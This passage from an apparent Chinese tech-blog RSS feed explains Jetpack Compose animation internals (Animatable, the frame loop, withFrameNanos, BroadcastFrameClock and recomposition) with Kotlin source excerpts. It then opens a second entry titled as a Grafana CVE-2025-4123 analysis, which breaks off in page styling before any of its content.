    <span class="hljs-comment">// 步骤2：创建一个"目标值传输通道"（只创建一次）</span>
    <span class="hljs-keyword">val</span> channel = remember { Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED) }
    
    <span class="hljs-comment">// 步骤3：每次重组时，把新的目标值发送到通道</span>
    SideEffect { 
        channel.trySend(targetValue) 
    }
    
    <span class="hljs-comment">// 步骤4：启动一个协程，监听通道并执行动画（只启动一次）</span>
    LaunchedEffect(channel) {
        <span class="hljs-keyword">for</span> (newTarget <span class="hljs-keyword">in</span> channel) {
            <span class="hljs-comment">// 获取最新的目标值（避免延迟）</span>
            <span class="hljs-keyword">val</span> latestTarget = channel.tryReceive().getOrNull() ?: newTarget
            
            <span class="hljs-comment">// 启动动画！</span>
            launch {
                <span class="hljs-keyword">if</span> (latestTarget != animatable.targetValue) {
                    animatable.animateTo(latestTarget)
                }
            }
        }
    }
    
    <span class="hljs-comment">// 步骤5：返回AnimationState对象</span>
    <span class="hljs-keyword">return</span> animatable.asState()
}
</code></pre>
<p><strong>为什么使用Channel而不是直接使用<code>LaunchedEffect(targetValue)</code>?</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 错误方式（会延迟一帧）</span>
LaunchedEffect(targetValue) {
    animatable.animateTo(targetValue)  
    <span class="hljs-comment">// 问题：如果目标值快速变化，协程会被取消并重启，导致卡顿</span>
}

<span class="hljs-comment">// ✅ 正确方式（使用 Channel）</span>
<span class="hljs-keyword">val</span> channel = remember { Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED) }
SideEffect { channel.trySend(targetValue) }
LaunchedEffect(channel) {
    <span class="hljs-keyword">for</span> (target <span class="hljs-keyword">in</span> channel) {
        <span class="hljs-keyword">val</span> latest = channel.tryReceive().getOrNull() ?: target
        launch { animatable.animateTo(latest) }
    }
}
</code></pre>
<p><strong>原因：</strong></p>
<ul>
<li><code>LaunchedEffect(key)</code> 当 key 变化时会<strong>取消并重启</strong>协程</li>
<li>如果用户快速点击 3 次，目标值变化：<code>1f → 1.2f → 1f → 1.2f</code></li>
<li>每次变化都会重启协程，导致动画卡顿</li>
<li><strong>Channel 不会重启协程</strong>，只是发送新值，协程持续运行</li>
</ul>
<p><strong><code>Channel.CONFLATED</code> 是什么意思？</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// CONFLATED = 只保留最新值，丢弃旧值</span>
<span class="hljs-keyword">val</span> channel = Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED)

<span class="hljs-comment">// 假设发送很快：</span>
channel.send(<span class="hljs-number">1.0f</span>)  <span class="hljs-comment">// 立即被下一个覆盖 ❌</span>
channel.send(<span class="hljs-number">2.0f</span>)  <span class="hljs-comment">// 立即被下一个覆盖 ❌</span>
channel.send(<span class="hljs-number">3.0f</span>)  <span class="hljs-comment">// ✅ 这是最新的，保留</span>

<span class="hljs-comment">// 接收时只会收到：3.0f</span>
</code></pre>
<p>这样可以<strong>避免动画队列积压</strong>，始终使用最新目标值。</p>
<h3 data-id="heading-35">4、3 Animatable.animateTo()</h3>
<h4 data-id="heading-36">4、3、1 创建动画规格</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animateTo</span><span class="hljs-params">(targetValue: <span class="hljs-type">T</span>, animationSpec: <span class="hljs-type">AnimationSpec</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
    <span class="hljs-comment">// 创建一个"目标动画"对象</span>
    <span class="hljs-keyword">val</span> animation = TargetBasedAnimation(
        animationSpec = animationSpec,      <span class="hljs-comment">// 比如：spring() 弹簧动画</span>
        initialValue = value,                <span class="hljs-comment">// 起始值：1.0f</span>
        targetValue = targetValue,           <span class="hljs-comment">// 目标值：1.2f</span>
        typeConverter = typeConverter        <span class="hljs-comment">// Float 转换器</span>
    )
    
    <span class="hljs-comment">// 执行动画</span>
    runAnimation(animation, ...)
}
</code></pre>
<p><strong>TargetBasedAnimation 是什么？</strong></p>
<ul>
<li>它包含了动画的所有信息：起点、终点、动画类型</li>
<li>可以根据时间戳计算出任意时刻的值</li>
<li>类似于一个<strong>数学函数</strong>：<code>value = f(time)</code></li>
</ul>
<h4 data-id="heading-37">4、3、2 互斥锁保护</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runAnimation</span><span class="hljs-params">(animation: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;)</span></span> {
    <span class="hljs-comment">// 🔒 互斥锁：确保同一时间只有一个动画在运行</span>
    mutatorMutex.mutate {
        <span class="hljs-keyword">try</span> {
            isRunning = <span class="hljs-literal">true</span>  <span class="hljs-comment">// 标记为运行中</span>
            
            <span class="hljs-comment">// 真正的动画循环（下一步）</span>
            endState.animate(animation, startTime) {
                updateState(internalState)  <span class="hljs-comment">// 每帧更新内部状态</span>
            }
            
            isRunning = <span class="hljs-literal">false</span>  <span class="hljs-comment">// 标记为完成</span>
        } <span class="hljs-keyword">catch</span> (e: CancellationException) {
            <span class="hljs-comment">// 如果新动画开始，旧动画会被取消</span>
            isRunning = <span class="hljs-literal">false</span>
            <span class="hljs-keyword">throw</span> e
        }
    }
}
</code></pre>
<p><strong>互斥锁的作用示意：</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 假设用户快速点击两次：</span>
<span class="hljs-selector-tag">launch</span> { <span class="hljs-selector-tag">animatable</span><span class="hljs-selector-class">.animateTo</span>(<span class="hljs-number">1.2</span>f) }  <span class="hljs-comment">// 动画 A 开始</span>
<span class="hljs-selector-tag">launch</span> { <span class="hljs-selector-tag">animatable</span><span class="hljs-selector-class">.animateTo</span>(<span class="hljs-number">1.0</span>f) }  <span class="hljs-comment">// 动画 B 想开始</span>

<span class="hljs-comment">// 执行流程：</span>
时间 <span class="hljs-number">0ms</span>:  动画 <span class="hljs-selector-tag">A</span> 获得锁，开始运行 (value = <span class="hljs-number">1.0</span> → <span class="hljs-number">1.2</span>)
时间 <span class="hljs-number">50ms</span>: 动画 <span class="hljs-selector-tag">B</span> 尝试获得锁，发现被占用
时间 <span class="hljs-number">50ms</span>: 动画 <span class="hljs-selector-tag">B</span> 取消动画 <span class="hljs-selector-tag">A</span>（抛出 <span class="hljs-selector-tag">CancellationException</span>）
时间 <span class="hljs-number">50ms</span>: 动画 <span class="hljs-selector-tag">A</span> 在 <span class="hljs-selector-tag">catch</span> 块中释放锁
时间 <span class="hljs-number">51ms</span>: 动画 <span class="hljs-selector-tag">B</span> 获得锁，开始运行 (value = <span class="hljs-number">1.05</span> → <span class="hljs-number">1.0</span>)

<span class="hljs-comment">// 结果：同时只有一个动画，平滑过渡！</span>
</code></pre>
<h4 data-id="heading-38">4、3、3 帧循环核心</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt </span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationState<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">animate</span><span class="hljs-params">(
    animation: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    startTimeNanos: <span class="hljs-type">Long</span> = AnimationConstants.UnspecifiedTime,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span> = {},
) {
    <span class="hljs-keyword">val</span> initialValue = animation.getValueFromNanos(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">val</span> initialVelocityVector = animation.getVelocityVectorFromNanos(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">var</span> lateInitScope: AnimationScope&lt;T, V&gt;? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (startTimeNanos == AnimationConstants.UnspecifiedTime) {
            <span class="hljs-keyword">val</span> durationScale = coroutineContext.durationScale
            <span class="hljs-comment">// 调用BroadcastFrameClock的withFrameNanos会挂起当前协程，并将其注册到等待列表中</span>
            animation.callWithFrameNanos {
                <span class="hljs-comment">// 第一帧来临的时候初始化动画作用域</span>
                lateInitScope =
                    AnimationScope(
                            initialValue = initialValue,
                            typeConverter = animation.typeConverter,
                            initialVelocityVector = initialVelocityVector,
                            lastFrameTimeNanos = it,
                            targetValue = animation.targetValue,
                            startTimeNanos = it,
                            isRunning = <span class="hljs-literal">true</span>,
                            onCancel = { isRunning = <span class="hljs-literal">false</span> },
                        )
                        .apply {
                            <span class="hljs-comment">// First frame</span>
                            doAnimationFrameWithScale(
                                it,
                                durationScale,
                                animation,
                                <span class="hljs-keyword">this</span><span class="hljs-symbol">@animate</span>,
                                block,
                            )
                        }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 第一帧来临的时候初始化动画作用域</span>
            lateInitScope =
                AnimationScope(
                        initialValue = initialValue,
                        typeConverter = animation.typeConverter,
                        initialVelocityVector = initialVelocityVector,
                        lastFrameTimeNanos = startTimeNanos,
                        targetValue = animation.targetValue,
                        startTimeNanos = startTimeNanos,
                        isRunning = <span class="hljs-literal">true</span>,
                        onCancel = { isRunning = <span class="hljs-literal">false</span> },
                    )
                    .apply {
                        <span class="hljs-comment">// First frame</span>
                        doAnimationFrameWithScale(
                            startTimeNanos,
                            coroutineContext.durationScale,
                            animation,
                            <span class="hljs-keyword">this</span><span class="hljs-symbol">@animate</span>,
                            block,
                        )
                    }
        }
        <span class="hljs-comment">// Subsequent frames</span>
        <span class="hljs-keyword">while</span> (lateInitScope!!.isRunning) {
            <span class="hljs-keyword">val</span> durationScale = coroutineContext.durationScale
            animation.callWithFrameNanos {
                lateInitScope!!.doAnimationFrameWithScale(it, durationScale, animation, <span class="hljs-keyword">this</span>, block)
            }
        }
        <span class="hljs-comment">// End of animation</span>
    } <span class="hljs-keyword">catch</span> (e: CancellationException) {
        lateInitScope?.isRunning = <span class="hljs-literal">false</span>
        <span class="hljs-keyword">if</span> (lateInitScope?.lastFrameTimeNanos == lastFrameTimeNanos) {
            <span class="hljs-comment">// There hasn't been another animation.</span>
            isRunning = <span class="hljs-literal">false</span>
        }
        <span class="hljs-keyword">throw</span> e
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">doAnimationFrameWithScale</span><span class="hljs-params">(
    frameTimeNanos: <span class="hljs-type">Long</span>,
    durationScale: <span class="hljs-type">Float</span>,
    anim: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span>,
) {
    <span class="hljs-keyword">val</span> playTimeNanos =
        <span class="hljs-keyword">if</span> (durationScale == <span class="hljs-number">0f</span>) {
            anim.durationNanos
        } <span class="hljs-keyword">else</span> {
            ((frameTimeNanos - startTimeNanos) / durationScale).toLong()
        }
    doAnimationFrame(frameTimeNanos, playTimeNanos, anim, state, block)
}

<span class="hljs-comment">// Impl detail, invoked every frame.</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">doAnimationFrame</span><span class="hljs-params">(
    frameTimeNanos: <span class="hljs-type">Long</span>,
    playTimeNanos: <span class="hljs-type">Long</span>,
    anim: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span>,
) {
    <span class="hljs-comment">// 1、 计算已经过了多久</span>
    lastFrameTimeNanos = frameTimeNanos
    <span class="hljs-comment">// 2、根据时长计算当前值</span>
    value = anim.getValueFromNanos(playTimeNanos)
    <span class="hljs-comment">// 3、计算当前速度</span>
    velocityVector = anim.getVelocityVectorFromNanos(playTimeNanos)
    <span class="hljs-comment">// 4、检查是否完成</span>
    <span class="hljs-keyword">val</span> isLastFrame = anim.isFinishedFromNanos(playTimeNanos)
    <span class="hljs-keyword">if</span> (isLastFrame) {
        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> This could probably be a little more granular</span>
        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> end time isn't necessarily last frame time</span>
        finishedTimeNanos = lastFrameTimeNanos
        isRunning = <span class="hljs-literal">false</span>
    }
    <span class="hljs-comment">// 5、更新内部状态，这里会触发重组</span>
    updateState(state)
    block()
}

<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">updateState</span><span class="hljs-params">(
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;
)</span></span> {
    <span class="hljs-comment">// 更新AnimationState的value，触发重组</span>
    state.value = value
    state.velocityVector.copyFrom(velocityVector)
    state.finishedTimeNanos = finishedTimeNanos
    state.lastFrameTimeNanos = lastFrameTimeNanos
    state.isRunning = isRunning
}

</code></pre>
<p><strong>帧循环可视化：</strong></p>
<pre><code class="hljs language-ini" lang="ini">帧 1 (0ms):   withFrameNanos 挂起 → VSync 到来 → 计算 <span class="hljs-attr">value</span> = <span class="hljs-number">1.0</span>
              ↓ 更新 state → 触发重组 → UI 显示 1.0
              
帧 2 (16ms):  withFrameNanos 挂起 → VSync 到来 → 计算 <span class="hljs-attr">value</span> = <span class="hljs-number">1.02</span>
              ↓ 更新 state → 触发重组 → UI 显示 1.02
              
帧 3 (32ms):  withFrameNanos 挂起 → VSync 到来 → 计算 <span class="hljs-attr">value</span> = <span class="hljs-number">1.04</span>
              ↓ 更新 state → 触发重组 → UI 显示 1.04
              
... (继续约 15 帧)

帧 18 (288ms): withFrameNanos 挂起 → VSync 到来 → 计算 <span class="hljs-attr">value</span> = <span class="hljs-number">1.2</span>
               ↓ 更新 state → 触发重组 → UI 显示 1.2
               ↓ <span class="hljs-attr">isRunning</span> = <span class="hljs-literal">false</span> → 退出循环 → 动画完成 ✓
</code></pre>
<h3 data-id="heading-39">4、3、4 callWithFrameNanos</h3>
<p><code>callWithFrameNanos</code>会调用<code>withFrameNanos</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">callWithFrameNanos</span><span class="hljs-params">(
    onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: <span class="hljs-built_in">Unit</span> {
    <span class="hljs-comment">// 根据动画类型选择帧时钟</span>
    <span class="hljs-keyword">if</span> (isInfinite) {
        withInfiniteAnimationFrameNanos(onFrame)  <span class="hljs-comment">// 无限动画</span>
    } <span class="hljs-keyword">else</span> {
        withFrameNanos { frameTime -&gt;              <span class="hljs-comment">// 普通动画</span>
            onFrame(frameTime / AnimationDebugDurationScale)
        }
    }
}
</code></pre>
<h3 data-id="heading-40">4、3、5 withFrameNanos是什么</h3>
<p><strong><code>coroutineContext</code>是哪个协程的上下文？</strong></p>
<p>在哪个协程里面调用<code>coroutineContext</code>就是哪个协程的上下文。<code>LaunchedEffect</code>启动了协程，执行动画代码，<code>coroutineContext</code>是<code>LaunchedEffect</code>的协程上下文。</p>
<p>在3、4章节介绍了<code>LaunchedEffect</code>使用的是Composer的协程上下文，<code>Composer</code>的协程上下文是<code>Recomposer</code>的协程上下文。上下文包含了<code>AndroidUiDispatcher</code>、<code>BroadcastFrameClock</code>、<code>effectJob</code>和<code>MotionDurationScale</code>。所以<code>coroutineContext.monotonicFrameClock</code>拿到的是<code>BroadcastFrameClock</code>。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
    <span class="hljs-comment">// coroutineContext是副作用的协程上下文</span>
    coroutineContext.monotonicFrameClock.withFrameNanos(onFrame)
    

<span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> CoroutineContext.monotonicFrameClock: MonotonicFrameClock
    <span class="hljs-keyword">get</span>() =
        <span class="hljs-keyword">this</span>[MonotonicFrameClock]
            ?: error(
                <span class="hljs-string">"A MonotonicFrameClock is not available in this CoroutineContext. Callers should supply "</span> +
                    <span class="hljs-string">"an appropriate MonotonicFrameClock using withContext."</span>
            )
    
</code></pre>
<p><code>withFrameNanos</code>会从<code>coroutineContext</code>中获取<code>MonotonicFrameClock</code>，这个 <code>MonotonicFrameClock</code>就是<code>Recomposer</code>的<code>BroadcastFrameClock</code>。</p>
<p><code>withFrameNanos</code>调用<code>BroadcastFrameClock</code>的<code>withFrameNanos</code>，<code>BroadcastFrameClock</code>的<code>withFrameNanos</code>会挂起当前协程，并将其注册到等待列表中。
当下一帧来临的时候，会唤醒Recomposer帧循环，调用<code>BroadcastFrameClock</code>的<code>sendFrame</code>来唤醒所有等待的动画协程。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendFrame</span><span class="hljs-params">(timeNanos: <span class="hljs-type">Long</span>)</span></span> {
        synchronized(lock) {
            <span class="hljs-comment">// 1. 交换列表：将当前等待列表与备用列表交换</span>
            <span class="hljs-comment">// 这样可以避免在恢复协程时新协程加入导致的问题</span>
            <span class="hljs-keyword">val</span> toResume = awaiters
            awaiters = spareList
            spareList = toResume
            
            <span class="hljs-comment">// 2. 重置计数器并增加版本号</span>
            pendingAwaitersCountUnlocked.incrementVersionAndResetCount()

            <span class="hljs-comment">// 3. 恢复所有等待的协程</span>
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
                toResume[i].resume(timeNanos)
            }
            
            <span class="hljs-comment">// 4. 清空列表</span>
            toResume.clear()
        }
    }
</code></pre>
<h3 data-id="heading-41">4、3、5 为什么<code>internalState.value = newValue</code> 会触发重组？</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">val</span> internalState = AnimationState(
    typeConverter = typeConverter,
    initialValue = initialValue
)

<span class="hljs-comment">// AnimationState.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnimationState</span>&lt;<span class="hljs-type">T, V</span>&gt; {
    <span class="hljs-comment">// 动画会修改这个值，触发重组</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">var</span> value: T <span class="hljs-keyword">by</span> mutableStateOf(initialValue)  ← 🔑 这是关键！
        <span class="hljs-keyword">internal</span> <span class="hljs-keyword">set</span>
}

<span class="hljs-comment">// 返回给 UI 的 State</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">asState</span><span class="hljs-params">()</span></span>: State&lt;T&gt; = internalState  ← 返回包含 mutableStateOf 的对象
</code></pre>
<p><strong>工作原理：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MyButton</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// animateFloatAsState 返回的是 AnimationState 对象</span>
    <span class="hljs-keyword">val</span> scaleState: State&lt;<span class="hljs-built_in">Float</span>&gt; = animateFloatAsState(...)
    
    <span class="hljs-comment">// 读取 scale 的值</span>
    <span class="hljs-keyword">val</span> scale <span class="hljs-keyword">by</span> scaleState  <span class="hljs-comment">// 实际读取 AnimationState.value</span>
    
    Box(modifier = Modifier.scale(scale)) {  
        <span class="hljs-comment">// Compose 在这里记录：</span>
        <span class="hljs-comment">// "Box 读取了 AnimationState.value"</span>
    }
}
</code></pre>
<p><strong>还记得在<a href="https://juejin.cn/post/7597276695403708457" target="_blank" title="https://juejin.cn/post/7597276695403708457">Compose原理四之重组</a>中介绍了重组的原理。具体到上面的例子，<code>animateFloatAsState</code>返回的是<code>AnimationState</code>对象，<code>Box</code>读取了状态变量<code>AnimationState.value</code>，<code>MyButton</code>的重组作用域对象放到了map中。动画协程调用<code>withFrameNanos</code>会挂起当前协程，并将其注册到等待列表中。当下一帧来临后，不停的修改<code>AnimationState.value</code>，不停的重新执行<code>MyButton</code>，<code>MyButton</code>读取最新的scale值，不停的进行缩放。</strong></p>
<h3 data-id="heading-42">4、3、6 MotionDurationScale：控制动画时长</h3>
<p>安卓需要支持"开发者选项"中的"动画时长缩放"设置，这是通过 <code>MotionDurationScale</code> 接口实现的。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MotionDurationScale.kt</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MotionDurationScale</span> : <span class="hljs-type">CoroutineContext.Element</span> {
    <span class="hljs-comment">// 缩放因子：1.0 为正常，0.0 为关闭动画，&gt; 1.0 为变慢</span>
    <span class="hljs-keyword">val</span> scaleFactor: <span class="hljs-built_in">Float</span>
}
</code></pre>
<p><strong>原理：</strong></p>
<ol>
<li>读取开发者选项的"动画时长缩放"。</li>
<li>创建一个实现了 <code>MotionDurationScale</code> 的 Context Element。</li>
<li>将其加入到 <code>effectCoroutineContext</code> 中。</li>
<li>在计算动画进度时，会查找这个 Element 并应用缩放。</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt (动画实现的简化逻辑)</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animate</span><span class="hljs-params">(...)</span></span> {
    <span class="hljs-keyword">val</span> scale = coroutineContext[MotionDurationScale]?.scaleFactor ?: <span class="hljs-number">1f</span>
    <span class="hljs-comment">// 根据 scale 调整每一帧的时间差</span>
}
</code></pre>
<h2 data-id="heading-43">五、总结</h2>
<ul>
<li><strong>Compose运行在一个复合上下文中，包含 <code>AndroidUiDispatcher</code>（主线程调度）、<code>BroadcastFrameClock</code>（帧广播）、<code>Job</code>（生命周期）、<code>MotionDurationScale</code>（动画时长缩放）。</strong></li>
<li><strong>动画本质是协程 + 帧循环 + 状态驱动重组。动画协程通过等待下一帧挂起，当下一帧来临后唤醒所有动画协程，动画协程更新状态触发重组。</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Grafana CVE-2025-4123漏洞分析：全读SSRF与账户接管]]></title>    <link>https://juejin.cn/post/7602420156397404203</link>    <guid>https://juejin.cn/post/7602420156397404203</guid>    <pubDate>2026-02-03T12:28:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397404203" data-draft-id="7602420156397387819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Grafana CVE-2025-4123漏洞分析：全读SSRF与账户接管"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-02-03T12:28:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Grafana CVE-2025-4123漏洞分析：全读SSRF与账户接管
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:28:52.000Z" title="Tue Feb 03 2026 12:28:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol 